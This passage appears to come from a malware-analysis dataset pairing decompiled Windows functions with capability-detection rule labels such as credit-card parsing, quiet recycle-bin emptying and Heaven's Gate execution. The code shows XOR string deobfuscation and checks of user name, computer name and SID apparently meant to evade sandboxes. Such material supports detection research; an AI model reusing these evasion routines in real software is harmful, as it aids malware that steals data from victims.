= (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    uVar13 = 0;\n    do {\n        *(var_14h + uVar13) = *(var_14h + uVar13) ^ 0x71;\n        uVar13 = uVar13 + 1;\n    } while (uVar13 < 0x19);\n    puVar10 = var_14h;\n    for (iVar12 = 6; iVar12 != 0; iVar12 = iVar12 + -1) {\n        *puVar10 = 0;\n        puVar10 = puVar10 + 1;\n    }\n    lpszLongPath = 0;\n    *puVar10 = 0;\n    pcVar11 = _sym.imp.KERNEL32.dll_GetLastError;\n    lpLibFileName = &var_ch - var_14h;\n    do {\n        iVar12 = lpszLongPath;\n        pcVar1 = var_14h + lpszLongPath;\n        cVar7 = (*pcVar11)();\n        uVar2 = *(&var_54h + iVar12 % 5);\n        uVar3 = pcVar1[lpLibFileName];\n        cVar8 = (*pcVar11)();\n        lpszLongPath = lpszLongPath + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (lpszLongPath < 0xc);\n    var_9ch = 0x3c;\n    var_90h = var_14h;\n    var_8ch = &lpDst;\n    var_88h = &ARG_0;\n    var_80h = 3;\n    var_98h = 0x40;\n    (*_sym.imp.ole32.dll_CoInitializeEx)(0, 6);\n    var_24h = 0x34211d39;\n    var_20h = 0x7b587e24;\n    var_1ch = 0x4d041400;\n    var_8h = 0x7864556a;\n    var_4h = CONCAT22(var_4h._2_2_, 0x4d68);\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    lpLibFileName = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar9);\n    lpszLongPath = 0;\n    *lpLibFileName = 0;\n    lpLibFileName[1] = 0;\n    lpLibFileName[2] = 0;\n    *(lpLibFileName + 3) = 0;\n    pcVar11 = _sym.imp.KERNEL32.dll_GetLastError;\n    var_54h = &var_24h - lpLibFileName;\n    do {\n        iVar12 = lpszLongPath;\n        pcVar1 = lpszLongPath + lpLibFileName;\n        cVar7 = (*pcVar11)();\n        uVar2 = *(&var_8h + iVar12 % 6);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*pcVar11)();\n        lpszLongPath = lpszLongPath + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (lpszLongPath < 0xc);\n    var_28h = 0x3d17036b;\n    var_24h = 0x17137d5a;\n    var_20h = 0xe4c4332;\n    var_1ch = 0x38612937;\n    var_8h = 0x51726b38;\n    var_4h = CONCAT31(var_4h._1_3_, 0x36);\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x11);\n    puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar9);\n    lpszLongPath = 0;\n    *puVar10 = 0;\n    puVar10[1] = 0;\n    puVar10[2] = 0;\n    puVar10[3] = 0;\n    *(puVar10 + 4) = 0;\n    var_54h = &var_28h - puVar10;\n    do {\n        iVar12 = lpszLongPath;\n        pcVar1 = lpszLongPath + puVar10;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar12 % 5);\n        uVar3 = pcVar1[var_54h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        puVar5 = lpLibFileName;\n        lpszLongPath = lpszLongPath + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (lpszLongPath < 0x10);\n    uVar9 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(lpLibFileName, puVar10);\n    pcVar11 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar9);\n    while( true ) {\n        var_94h = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n        iVar12 = (*pcVar11)(&var_9ch);\n        if (iVar12 != 0) break;\n        iVar12 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar12 != 0x4c7) break;\n        (*_sym.imp.KERNEL32.dll_Sleep)(100);\n    }\n    (*_sym.imp.ole32.dll_CoUninitialize)();\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetProcessHeap;\n    uVar9 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar10);\n    pcVar11 = _sym.imp.KERNEL32.dll_HeapFree;\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar9);\n    uVar9 = (*pcVar4)(0, puVar5);\n    (*_sym.imp.ntdll.dll_RtlFreeHeap)(uVar9);\n    uVar13 = 0;\n    do {\n        *(var_14h + uVar13) = *(var_14h + uVar13) * -0x13;\n        uVar13 = uVar13 + 1;\n    } while (uVar13 < 0x19);\n    uVar9 = (*pcVar4)(0, var_14h);\n    (*pcVar11)(uVar9);\n    uVar13 = 0;\n    do {\n        *(var_58h + uVar13) = *(var_58h + uVar13) + -0x3d;\n        uVar13 = uVar13 + 1;\n    } while (uVar13 < 0x3d);\n    uVar9 = (*pcVar4)(0, var_58h);\n    (*pcVar11)(uVar9);\n    fcn.004065d4();\n    return 1;\n}\n",
        "token_count": 3294
    },
    "0040aace": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nuint fcn.0040aace(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint ReturnLength;\n    uint TokenInformation;\n    uint TokenHandle;\n    \n    TokenInformation = 0;\n    if (*0x4279e8 == 6) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(0x20008, &TokenHandle);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar1);\n        if (iVar2 != 0) {\n            (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(TokenHandle, 0x14, &TokenInformation, 4, &ReturnLength);\n            (*_sym.imp.KERNEL32.dll_CloseHandle)(TokenHandle);\n        }\n    }\n    return TokenInformation;\n}\n",
        "token_count": 177
    },
    "004101fe": {
        "rules": [
            "parse credit card information/3266979fad224c5386fccfb7f2b301b7"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool fcn.004101fe(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    int32_t iVar5;\n    char cVar6;\n    char cVar7;\n    uint uVar8;\n    int32_t iVar9;\n    uint *puVar10;\n    uint32_t uVar11;\n    bool bVar12;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    int32_t var_10h;\n    uint hObject;\n    int32_t StringSid;\n    uint dwBytes;\n    \n    bVar12 = false;\n    dwBytes = 0;\n    hObject = 0;\n    StringSid = 0;\n    (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0);\n    uVar8 = (*_sym.imp.KERNEL32.dll_GetCurrentProcess)(8, &hObject);\n    iVar9 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(uVar8);\n    pcVar4 = _sym.imp.ADVAPI32.dll_GetTokenInformation;\n    if (iVar9 != 0) {\n        (*_sym.imp.ADVAPI32.dll_GetTokenInformation)(hObject, 1, 0, dwBytes, &dwBytes);\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if ((iVar9 == 0x7a) &&\n           (puVar10 = (*_sym.imp.KERNEL32.dll_GlobalAlloc)(0x40, dwBytes),  var_18h = puVar10,  puVar10 != NULL)) {\n            iVar9 = (*pcVar4)(hObject, 1, puVar10, dwBytes, &dwBytes);\n            if ((iVar9 != 0) &&\n               ((iVar9 = (*_sym.imp.ADVAPI32.dll_ConvertSidToStringSidW)(*puVar10, &StringSid),  iVar9 != 0 &&\n                (StringSid != 0)))) {\n                var_34h = 0x6b784b3d;\n                var_30h = 0x55666e5a;\n                var_2ch = 0x4b436b5e;\n                var_28h = 0x6e536b64;\n                var_24h._0_2_ = 0x554b;\n                var_20h = 0x6b554b6e;\n                var_1ch._0_1_ = 0x6b;\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x25);\n                var_14h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar8);\n                uVar11 = 0;\n                do {\n                    *(var_14h + uVar11) = *(var_14h + uVar11) * -0x68;\n                    uVar11 = uVar11 + 1;\n                } while (uVar11 < 0x25);\n                puVar10 = var_14h;\n                for (iVar9 = 9; iVar9 != 0; iVar9 = iVar9 + -1) {\n                    *puVar10 = 0;\n                    puVar10 = puVar10 + 1;\n                }\n                var_10h = 0;\n                *puVar10 = 0;\n                iVar9 = &var_34h - var_14h;\n                do {\n                    iVar5 = var_10h;\n                    pcVar1 = var_14h + var_10h;\n                    cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    uVar2 = *(&var_20h + iVar5 % 5);\n                    uVar3 = pcVar1[iVar9];\n                    cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n                    puVar10 = var_14h;\n                    var_10h = var_10h + 1;\n                    *pcVar1 = cVar7 + ((uVar2 ^ uVar3) - cVar6);\n                } while (var_10h < 0x12);\n                iVar9 = (*_sym.imp.SHLWAPI.dll_StrCmpIW)(var_14h, StringSid);\n                bVar12 = iVar9 == 0;\n                (*_sym.imp.KERNEL32.dll_LocalFree)(StringSid);\n                uVar11 = 0;\n                do {\n                    pcVar1 = puVar10 + uVar11;\n                    *pcVar1 = *pcVar1 + -0x5e;\n                    uVar11 = uVar11 + 1;\n                } while (uVar11 < 0x25);\n                uVar8 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, puVar10);\n                (*_sym.imp.KERNEL32.dll_HeapFree)(uVar8);\n                puVar10 = var_18h;\n            }\n            (*_sym.imp.KERNEL32.dll_GlobalFree)(puVar10);\n        }\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(hObject);\n    }\n    return bVar12;\n}\n",
        "token_count": 1165
    },
    "0040ab21": {
        "rules": [
            "64-bit execution via heavens gate/41888d14e91b4c9e83f5980fa2a0ad87"
        ],
        "decompiled_code": "\nuint __cdecl\nfcn.0040ab21(uint noname_0, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch, uint arg_20h)\n\n{\n    uint var_40h;\n    int32_t var_38h;\n    int32_t var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    uint var_28h_2;\n    uint var_20h_2;\n    uint var_18h_2;\n    uint var_10h_2;\n    \n    return 0x2b;\n}\n",
        "token_count": 321
    },
    "0040ac19": {
        "rules": [
            "64-bit execution via heavens gate/d0eb93f2c5e64800b89b59bc3f7592fa",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040ac19(void)\n\n{\n    return;\n}\n",
        "token_count": 16
    },
    "0041019c": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nint32_t __cdecl fcn.0041019c(int32_t arg_8h, int32_t arg_ch)\n\n{\n    char *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint var_1h;\n    \n    uVar2 = 0;\n    if (arg_ch != 4) {\n        do {\n            iVar3 = 4;\n            pcVar1 = \"DDDD\";\n            do {\n                iVar3 = iVar3 + -1;\n                if (pcVar1[arg_8h + -0x418000 + uVar2] != *pcVar1) {\n                    iVar3 = pcVar1[arg_8h + -0x418000 + uVar2] - *pcVar1;\n                    break;\n                }\n                pcVar1 = pcVar1 + 1;\n            } while (iVar3 != 0);\n            if (iVar3 == 0) {\n                return uVar2 + arg_8h;\n            }\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < arg_ch - 4U);\n    }\n    return 0;\n}\n",
        "token_count": 265
    },
    "004109a8": {
        "rules": [
            "parse credit card information/4eef9ae1278b42f592aee8ead6d8bf37"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuchar * fcn.004109a8(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t iVar4;\n    char cVar5;\n    char cVar6;\n    uint uVar7;\n    int32_t iVar8;\n    uint32_t uVar9;\n    uchar *puVar10;\n    uchar *puVar11;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    ushort var_3ch;\n    uint var_3ah;\n    uint var_35h;\n    uint var_31h;\n    uint var_2dh;\n    uint var_29h;\n    uint var_25h;\n    uint var_21h;\n    uint var_1dh;\n    uint var_19h;\n    uint var_14h;\n    uint var_10h;\n    uchar *var_ch;\n    int32_t var_8h;\n    uint32_t var_4h;\n    \n    var_3ah._0_1_ = 0x1a;\n    var_4ch = 0x56274f11;\n    var_48h = 0x4f145020;\n    var_44h = 0x50255620;\n    var_40h = 0x562d4f17;\n    var_3ch = 0x502a;\n    stack0xffffffc3 = 0x2f562e4f;\n    var_35h = 0x2b4f1d50;\n    var_31h = 0x502c56;\n    var_2dh = 0x3156344f;\n    var_29h = 0x314f0350;\n    var_25h._0_2_ = 0x3656;\n    var_25h._2_1_ = 0x50;\n    var_25h._3_1_ = 6;\n    var_21h = 0x3b56324f;\n    var_1dh = 0x3f4f0950;\n    var_19h._0_2_ = 0x4356;\n    var_19h._2_1_ = 0x50;\n    var_14h = 0x56454f70;\n    var_10h._0_2_ = 0x5043;\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x6d);\n    iVar8 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n    uVar9 = 0;\n    do {\n        *(iVar8 + uVar9) = *(iVar8 + uVar9) ^ 0xef;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x6d);\n    var_8h = iVar8;\n    sub.ntdll.dll_memset(iVar8, 0, 0x6d);\n    var_4h = 0;\n    var_ch = &var_4ch - iVar8;\n    do {\n        uVar9 = var_4h;\n        pcVar1 = iVar8 + var_4h;\n        cVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_14h + uVar9 % 6);\n        uVar3 = var_ch[pcVar1];\n        cVar6 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_4h = var_4h + 1;\n        *pcVar1 = cVar6 + ((uVar2 ^ uVar3) - cVar5);\n    } while (var_4h < 0x36);\n    uVar9 = fcn.0041082a();\n    uVar9 = uVar9 % 0x38 + 8;\n    puVar10 = var_ch;\n    if (uVar9 != 0) {\n        uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, uVar9 * 2 + 2);\n        puVar10 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar7);\n        iVar4 = var_8h;\n        if (puVar10 != NULL) {\n            var_4h = 0;\n            puVar11 = puVar10;\n            for (iVar8 = uVar9 * 2 + 2; iVar8 != 0; iVar8 = iVar8 + -1) {\n                *puVar11 = 0;\n                puVar11 = puVar11 + 1;\n            }\n            if (uVar9 != 0) {\n                do {\n                    iVar8 = fcn.0041082a();\n                    *(puVar10 + var_4h * 2) = *(iVar4 + (iVar8 % 0x1a) * 2);\n                    var_4h = var_4h + 1;\n                } while (var_4h < uVar9);\n            }\n            *(puVar10 + uVar9 * 2) = 0;\n            iVar8 = iVar4;\n        }\n    }\n    uVar9 = 0;\n    do {\n        *(iVar8 + uVar9) = *(iVar8 + uVar9) * -0x6c;\n        uVar9 = uVar9 + 1;\n    } while (uVar9 < 0x6d);\n    uVar7 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(0, iVar8);\n    (*_sym.imp.KERNEL32.dll_HeapFree)(uVar7);\n    return puVar10;\n}\n",
        "token_count": 1251
    },
    "00412593": {
        "rules": [
            "empty recycle bin quietly/a05fef7955a340fbb66225983c77e1df"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint32_t fcn.00412593(void)\n\n{\n    char *pcVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    code *pcVar4;\n    code *pcVar5;\n    code *pcVar6;\n    char cVar7;\n    char cVar8;\n    int32_t iVar9;\n    uint uVar10;\n    uint *puVar11;\n    uint *puVar12;\n    uint *puVar13;\n    uint *puVar14;\n    uint *puVar15;\n    int32_t iVar16;\n    uint *puVar17;\n    uint *puVar18;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint extraout_ECX_03;\n    uint extraout_ECX_04;\n    uint extraout_ECX_05;\n    uint32_t uVar19;\n    uint var_bch;\n    uint var_b8h;\n    uint var_b4h;\n    int32_t var_b0h;\n    uint var_ach;\n    uint var_a8h;\n    int32_t var_a4h;\n    uint var_a0h;\n    uint var_9ch;\n    uint var_98h;\n    uint pcbBuffer;\n    uint *var_90h;\n    uint var_8ch;\n    uint *var_88h;\n    uint *var_84h;\n    uint var_80h;\n    uint *var_7ch;\n    uint var_78h;\n    uint *var_74h;\n    uint *var_70h;\n    uint *var_6ch;\n    uint *var_68h;\n    uint *var_64h;\n    uint *var_60h;\n    uint var_5ch;\n    uchar *var_58h;\n    uint *var_54h;\n    uint *var_50h;\n    uint var_4ch;\n    uint *var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint *var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uchar var_1ch [2];\n    uint var_1ah;\n    uchar var_16h;\n    uchar var_15h;\n    uchar var_14h;\n    uchar var_13h;\n    uchar var_12h;\n    uint var_11h;\n    uint *var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar9 = fcn.004122f4();\n    if (iVar9 != 0) {\n        fcn.004124c9();\n    }\n    var_1ah._0_1_ = 6;\n    var_1ch[0] = 0x2a;\n    var_1ch[1] = 0x17;\n    var_1ah._1_1_ = 0x1c;\n    var_1ah._2_1_ = 1;\n    var_1ah._3_1_ = 0x22;\n    var_16h = 5;\n    var_15h = 0x4f;\n    var_14h = 0x10;\n    var_13h = 8;\n    var_12h = 0x22;\n    var_11h._0_1_ = 0x75;\n    var_84h = 0x7461754e;\n    var_80h._0_1_ = 100;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    puVar11 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    *puVar11 = 0;\n    puVar11[1] = 0;\n    puVar11[2] = 0;\n    *(puVar11 + 3) = 0;\n    var_48h = var_1ch + -puVar11;\n    var_ch = NULL;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_ch + puVar11;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_84h + iVar9 % 5);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 0xc);\n    iVar9 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(puVar11);\n    if (iVar9 != 0) {\n        fcn.004124c9();\n    }\n    var_1ch[0] = 0x27;\n    var_1ch[1] = 0xd;\n    var_1ah._0_1_ = 0x26;\n    var_1ah._1_1_ = 0x10;\n    var_1ah._2_1_ = 0x2f;\n    var_1ah._3_1_ = 0x3e;\n    var_16h = 0x38;\n    var_15h = 0x41;\n    var_14h = 0x2b;\n    var_13h = 0x19;\n    var_12h = 0x27;\n    var_11h._0_1_ = 0x52;\n    var_8h = 0x754f6f54;\n    var_4h._0_1_ = 0x4b;\n    var_4h._1_1_ = 0x52;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    puVar12 = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    var_ch = NULL;\n    *puVar12 = 0;\n    puVar12[1] = 0;\n    puVar12[2] = 0;\n    *(puVar12 + 3) = 0;\n    var_48h = var_1ch + -puVar12;\n    var_84h = puVar12;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_ch + puVar12;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 0xc);\n    iVar9 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(puVar12);\n    if (iVar9 != 0) {\n        fcn.004124c9();\n    }\n    pcbBuffer = 0x400;\n    iVar9 = (*_sym.imp.ADVAPI32.dll_GetUserNameA)(0x427bc8, &pcbBuffer);\n    if (iVar9 == 0) {\n        fcn.004124c9();\n    }\n    var_1ch[0] = 0x73;\n    var_1ch[1] = 0x1c;\n    var_1ah._0_1_ = 0x21;\n    var_1ah._1_1_ = 0x23;\n    var_1ah._2_1_ = 1;\n    var_1ah._3_1_ = 0x1c;\n    var_16h = 0x44;\n    var_15h = 0x3c;\n    var_14h = 0x20;\n    var_13h = 0x34;\n    var_12h = 0x16;\n    var_11h._0_1_ = 0x72;\n    var_8h = 0x51536930;\n    var_4h._0_1_ = 100;\n    var_4h._1_1_ = 0x72;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0xd);\n    puVar12 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_ch = NULL;\n    *puVar12 = 0;\n    puVar12[1] = 0;\n    puVar12[2] = 0;\n    *(puVar12 + 3) = 0;\n    var_48h = var_1ch + -puVar12;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_ch + puVar12;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 0xc);\n    iVar9 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x427bc8, puVar12);\n    if (iVar9 == 0) {\n        fcn.004124c9();\n    }\n    var_8h = 0x54561763;\n    var_4h._0_1_ = 8;\n    var_4h._1_1_ = 0x5f;\n    var_4h._2_1_ = 0xe;\n    var_4h._3_1_ = 0x38;\n    var_60h = 0x30387630;\n    var_5ch._0_1_ = 0x6a;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 9);\n    puVar13 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_ch = NULL;\n    *puVar13 = 0;\n    puVar13[1] = 0;\n    *(puVar13 + 2) = 0;\n    var_48h = &var_8h - puVar13;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_ch + puVar13;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_60h + iVar9 % 5);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 8);\n    iVar9 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x427bc8, puVar13);\n    uVar10 = extraout_ECX;\n    if (iVar9 == 0) {\n        fcn.004124c9();\n        uVar10 = extraout_ECX_00;\n    }\n    pcbBuffer = 0x400;\n    var_20h = 0x62304502;\n    var_1ch[0] = 0x3c;\n    var_1ch[1] = 0x7a;\n    var_1ah._0_1_ = 0x30;\n    var_1ah._1_1_ = 0x41;\n    var_1ah._2_1_ = 0x15;\n    var_1ah._3_1_ = 0x52;\n    var_16h = 0x13;\n    var_15h = 0x45;\n    var_14h = 0x2f;\n    var_13h = 0x62;\n    var_12h = 0x3d;\n    var_11h._0_1_ = 0x7a;\n    var_11h._1_1_ = 0x45;\n    var_11h._2_1_ = 0x41;\n    var_60h = 0x6241457a;\n    var_5ch._0_1_ = 0x52;\n    fcn.004036b5(uVar10);\n    pcVar4 = _sym.imp.KERNEL32.dll_GetLastError;\n    var_48h = var_1ch + (-4 - var_b0h);\n    var_ch = NULL;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_b0h + var_ch;\n        cVar7 = (*pcVar4)();\n        uVar2 = *(&var_60h + iVar9 % 5);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*pcVar4)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 0x12);\n    iVar9 = (*_sym.imp.KERNEL32.dll_GetComputerNameA)(0x427bc8, &pcbBuffer);\n    uVar10 = extraout_ECX_01;\n    if (iVar9 == 0) {\n        fcn.004124c9();\n        uVar10 = extraout_ECX_02;\n    }\n    var_20h = 0x736e671a;\n    var_1ch[0] = 0x31;\n    var_1ch[1] = 0x38;\n    var_1ah._0_1_ = 0x45;\n    var_1ah._1_1_ = 0x4b;\n    var_1ah._2_1_ = 0x5f;\n    var_1ah._3_1_ = 0x42;\n    var_16h = 0x18;\n    var_15h = 0x67;\n    var_14h = 0x6e;\n    var_13h = 0x73;\n    var_12h = 0x31;\n    var_11h._0_1_ = 0x38;\n    var_11h._1_1_ = 0x67;\n    var_11h._2_1_ = 0x4b;\n    var_60h = 0x734b6738;\n    var_5ch._0_1_ = 0x42;\n    fcn.0040363a(uVar10);\n    var_48h = var_1ch + (-4 - var_a4h);\n    var_ch = NULL;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_a4h + var_ch;\n        cVar7 = (*pcVar4)();\n        uVar2 = *(&var_60h + iVar9 % 5);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*pcVar4)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 0x12);\n    var_8ch = 0x2f1a0e32;\n    var_88h = 0x4f390403;\n    var_8h = 0x6b544f61;\n    var_4h._0_1_ = 0x41;\n    var_4h._1_1_ = 0x4b;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 9);\n    puVar14 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_ch = NULL;\n    *puVar14 = 0;\n    puVar14[1] = 0;\n    *(puVar14 + 2) = 0;\n    var_48h = &var_8ch - puVar14;\n    var_60h = puVar14;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_ch + puVar14;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 8);\n    iVar9 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x427bc8, puVar14);\n    if (iVar9 == 0) {\n        fcn.004124c9();\n    }\n    var_40h = 0x3d266b61;\n    var_3ch = 0x38171a2f;\n    var_8h = 0x716f3856;\n    var_4h._0_1_ = 0x79;\n    var_4h._1_1_ = 0x53;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 9);\n    puVar14 = (*_sym.imp.ntdll.dll_RtlAllocateHeap)(uVar10);\n    var_ch = NULL;\n    *puVar14 = 0;\n    puVar14[1] = 0;\n    *(puVar14 + 2) = 0;\n    var_48h = &var_40h - puVar14;\n    var_88h = puVar14;\n    do {\n        iVar9 = var_ch;\n        pcVar1 = var_ch + puVar14;\n        cVar7 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        uVar2 = *(&var_8h + iVar9 % 6);\n        uVar3 = pcVar1[var_48h];\n        cVar8 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        var_ch = var_ch + 1;\n        *pcVar1 = cVar8 + ((uVar2 ^ uVar3) - cVar7);\n    } while (var_ch < 8);\n    iVar9 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(0x427bc8, puVar14);\n    if (iVar9 == 0) {\n        fcn.004124c9();\n    }\n    var_2ch = 0x15281802;\n    var_28h = 0x1c187930;\n    var_24h = 0x6b221526;\n    var_20h = 0x1330b09;\n    var_1ch[0] = 0x33;\n    var_1ch[1] = 0x71;\n    var_1ah._0_1_ = 5;\n    var_1ah._1_1_ = 0x17;\n    var_1ah._2_1_ = 0x26;\n    var_1ah._3_1_ = 2;\n    var_16h = 0x1e;\n    var_15h = 0x4b;\n    var_14h = 0x3e;\n    var_13h = 0x3c;\n    var_12h = 0x17;\n    var_11h._0_1_ = 0x51;\n    var_8h = 0x517a594a;\n    var_4h._0_1_ = 0x67;\n    var_4h._1_1_ = 0x38;\n    uVar10 = (*_sym.imp.KERNEL32.dll_GetProcessHeap)(8, 0x1d);\n    var_90h = (*_sym.imp.KERNEL32.dll_HeapAlloc)(uVar10);\n    var_ch = NULL;\n    puVar14 = var_90h;\n    for (iVar9 = 7; iVar9 != 0; iVar9 = iVar9 + -1) {\n        *puVar14 = 0;\n        puVar14 = puVar14 + 1;\n    }\n    *puVar14 = 0;\n    pcVar4 = 